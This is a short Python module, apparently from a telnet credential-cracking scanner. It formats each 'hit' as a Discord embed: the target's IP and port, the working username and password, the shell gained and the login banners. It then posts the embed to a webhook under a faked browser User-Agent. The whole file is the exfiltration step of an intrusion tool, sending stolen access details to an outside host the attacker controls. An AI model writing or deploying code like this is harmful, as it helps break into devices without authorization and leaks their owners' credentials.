"""Discord webhook sink."""

import asyncio
import json
import time
from urllib.request import Request, urlopen


async def post_hit(webhook: str, hit) -> None:
    embed = {
        "title": "Telnet Hit",
        "color": 0x00FF7F,
        "fields": [
            {"name": "IP:Port",     "value": f"`{hit.ip}:{hit.port}`",      "inline": True},
            {"name": "Creds",       "value": f"`{hit.user}:{hit.password}`", "inline": True},
            {"name": "Shell",       "value": f"`{hit.shell}`",              "inline": True},
            {"name": "Duration",    "value": f"`{hit.duration}s`",          "inline": True},
            {"name": "Pre-banner",  "value": f"```{hit.banner[:900]}```",   "inline": False},
            {"name": "Post-banner", "value": f"```{hit.post_auth_banner[:900]}```", "inline": False},
        ],
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(hit.ts)),
    }
    payload = json.dumps({"embeds": [embed]}).encode()

    def _send():
        req = Request(
            webhook,
            data=payload,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
        )
        try:
            urlopen(req, timeout=10)
        except Exception as e:
            print(f"[!] webhook failed: {e}")

    await asyncio.get_event_loop().run_in_executor(None, _send)
